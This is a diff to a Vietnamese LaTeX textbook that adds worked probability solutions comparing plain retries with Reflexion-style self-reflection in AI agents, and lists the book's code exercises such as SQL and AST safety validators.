+    \item Lần 1: $p_1 = 0.80 \implies q_1 = 1 - 0.80 = 0.20$.
+    \item Lần 2: $p_2 = 0.80 \times 0.70 = 0.56 \implies q_2 = 1 - 0.56 = 0.44$.
+    \item Lần 3: $p_3 = 0.56 \times 0.70 = 0.392 \implies q_3 = 1 - 0.392 = 0.608$.
+  \end{itemize}
+
+  \item[b)] Xác suất hệ thống thất bại cả 3 lần thử:
+  \begin{equation*}
+  Q_3 = q_1 \cdot q_2 \cdot q_3 = 0.20 \times 0.44 \times 0.608 = 0.053504
+  \end{equation*}
+  Xác suất hoàn thành thành công sau tối đa 3 lần thử:
+  \begin{equation*}
+  P_{\text{success}} = 1 - Q_3 = 1 - 0.053504 = 0.946496 \quad (\mathbf{94.65\%})
+  \end{equation*}
+
+  \item[c)] So sánh với mô hình lý tưởng không bị ô nhiễm ngữ cảnh ($\gamma = 1.0$):
+  \begin{equation*}
+  P_{\text{ideal}} = 1 - 0.20^3 = 1 - 0.008 = 0.9920 \quad (\mathbf{99.20\%})
+  \end{equation*}
+  Hiện tượng ô nhiễm ngữ cảnh làm sụt giảm $4.55\%$ độ tin cậy của hệ thống. Để khắc phục, kỹ sư AI cần áp dụng kỹ thuật \term{Reflexion} hoặc \term{Context Compression} (như \code{AgentMemoryBuffer}): Tóm tắt các thông báo lỗi thành các bài học cô đọng thay vì nhồi toàn bộ vết lỗi dài hàng nghìn dòng vào prompt.
+\end{itemize}
+
+\paragraph{Lời giải Bài B.6}:
+\begin{itemize}
+  \item[a)] \textbf{Tính toán với kiến trúc Reflexion}:
+  Tại mỗi lần thử sau phản tư, bài học kinh nghiệm giúp tăng xác suất thành công:
+  \begin{itemize}
+    \item Lần 1: $p_1 = 0.50 \implies q_1 = 1 - 0.50 = 0.50$.
+    \item Lần 2: $p_2 = 0.50 + (1 - 0.50) \times 0.40 = 0.70 \implies q_2 = 1 - 0.70 = 0.30$.
+    \item Lần 3: $p_3 = 0.70 + (1 - 0.70) \times 0.40 = 0.82 \implies q_3 = 1 - 0.82 = 0.18$.
+  \end{itemize}
+  Xác suất thất bại cả 3 lần:
+  \begin{equation*}
+  Q_{\text{fail, Reflexion}} = q_1 \cdot q_2 \cdot q_3 = 0.50 \times 0.30 \times 0.18 = 0.0270
+  \end{equation*}
+  Xác suất giải quyết thành công bài toán sau tối đa 3 lần thử:
+  \begin{equation*}
+  P_{\text{success, Reflexion}} = 1 - 0.0270 = \mathbf{0.9730} \quad (\mathbf{97.30\%})
+  \end{equation*}
+
+  \item[b)] \textbf{Tính toán với cơ chế Retry thông thường}:
+  Với $p_0 = 0.50, \gamma = 0.70$:
+  \begin{itemize}
+    \item Lần 1: $p_1 = 0.50 \implies q_1 = 0.50$.
+    \item Lần 2: $p_2 = 0.50 \times 0.70 = 0.35 \implies q_2 = 1 - 0.35 = 0.65$.
+    \item Lần 3: $p_3 = 0.35 \times 0.70 = 0.245 \implies q_3 = 1 - 0.245 = 0.755$.
+  \end{itemize}
+  Xác suất thất bại cả 3 lần:
+  \begin{equation*}
+  Q_{\text{fail, Retry}} = 0.50 \times 0.65 \times 0.755 = 0.245375
+  \end{equation*}
+  Xác suất giải quyết thành công sau tối đa 3 lần thử:
+  \begin{equation*}
+  P_{\text{success, Retry}} = 1 - 0.245375 = \mathbf{0.754625} \quad (\mathbf{75.46\%})
+  \end{equation*}
+
+  \item[c)] \textbf{Kết luận kỹ thuật}:
+  Reflexion nâng xác suất thành công từ $75.46\%$ lên tới $97.30\%$ (mức tăng trưởng nhảy vọt tới $\mathbf{+21.84\%}$). Điều này chứng minh rằng việc chắt lọc bài học kinh nghiệm ngắn gọn lưu vào Episodic Memory có giá trị sống còn trong kỹ nghệ Agent, biến một hệ thống lập luận yếu kém thành một tác tử tự sửa sai siêu việt!
+\end{itemize}
+
 \subsection{Lời Giải Nhóm C: Thực Hành Kỹ Nghệ \& Lập Trình}
 Toàn bộ mã nguồn kiểm chứng đã được trình bày chi tiết tại Mục~\ref{sec:python-state-graph-engine}, bao gồm:
-1. \code{SimpleStateGraph}: Động cơ đồ thị trạng thái với cơ chế State Reducer.
-2. \code{SQLSafetyValidator}: Rào chắn an toàn kiểm định cú pháp SQL, chỉ cho phép lệnh đọc dữ liệu an toàn.
-3. \code{SupervisorRouter}: Bộ định tuyến ý định người dùng và chuyển giao cho con người khi có khiếu nại gay gắt.
-4. \code{AgentMemoryBuffer}: Cửa sổ trượt bộ nhớ tự động tóm tắt ngữ cảnh.
+1. \code{SimpleStateGraph}: Động cơ đồ thị trạng thái với cơ chế State Reducer (Bài C.1).
+2. \code{SQLSafetyValidator}: Rào chắn an toàn kiểm định cú pháp SQL, chỉ cho phép lệnh đọc dữ liệu an toàn (Bài C.2).
+3. \code{SupervisorRouter}: Bộ định tuyến ý định người dùng và chuyển giao cho con người khi có khiếu nại gay gắt (Bài C.3).
+4. \code{AgentMemoryBuffer}: Cửa sổ trượt bộ nhớ tự động tóm tắt ngữ cảnh (Bài C.4).
+5. \code{MultiAgentDebateEngine}: Động cơ tranh biện đa tác tử và hội tụ phán quyết trọng tài (Bài C.5).
+6. \code{ReflexionAgent}: Kiến trúc tác tử tự phản tư với bộ nhớ phân tập Episodic Memory (Bài C.6).
+7. \code{ASTToolSecurityValidator}: Hộp cát kiểm định cú pháp tĩnh AST bảo vệ Tool Execution (Bài C.7).
 
 \subsection{Lời Giải Nhóm D: Phân Tích Thất Bại \& Debugging Thực Tế (Post-Mortem Analysis)}
 
